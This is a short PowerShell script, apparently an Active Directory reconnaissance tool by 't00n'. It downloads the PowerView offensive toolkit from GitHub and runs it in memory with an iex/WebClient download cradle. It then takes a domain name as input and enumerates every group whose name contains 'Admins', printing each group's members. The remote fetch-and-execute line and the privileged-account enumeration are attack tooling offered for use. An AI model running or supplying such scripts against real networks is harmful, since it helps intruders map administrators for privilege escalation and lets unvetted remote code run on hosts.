 Write-Host @"

 ________  ________  ________  _____ ______   _______   _____ ______      
|\   ____\|\   __  \|\   __  \|\   _ \  _   \|\  ___ \ |\   _ \  _   \    
\ \  \___|\ \  \|\  \ \  \|\  \ \  \\\__\ \  \ \   __/|\ \  \\\__\ \  \   
 \ \  \  __\ \   _  _\ \  \\\  \ \  \\|__| \  \ \  \_|/_\ \  \\|__| \  \  
  \ \  \|\  \ \  \\  \\ \  \\\  \ \  \    \ \  \ \  \_|\ \ \  \    \ \  \ 
   \ \_______\ \__\\ _\\ \_______\ \__\    \ \__\ \_______\ \__\    \ \__\
    \|_______|\|__|\|__|\|_______|\|__|     \|__|\|_______|\|__|     \|__|
                                                                                                                                   
"@ -ForegroundColor DarkCyan
Write-Host created by: t00n -ForegroundColor DarkGray
Write-Host "----------------------------------------------------------------------------------"
Write-Host

iex (New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1")
Write-Host -NoNewLine "Type Your Domain Name (i.e:domain.local): " -ForegroundColor Blue
$UserInput0 = Read-Host

Write-Host

$AdminGroups = Get-NetGroup -GroupName "*Admins*" | Out-File -FilePath "AdminGroups.txt"
Get-Content -Path "AdminGroups.txt" | ForEach-Object {
    $Value = $_ 
    $SearchMemberShip = Get-NetGroupMember -GroupName "$Value" -Domain $UserInput0 | select MemberName
    Write-Host "Group Name : $Value" -ForegroundColor DarkBlue
    foreach ($item in $SearchMemberShip) {
        Write-Host $item
        
    }
    Write-Host

} 
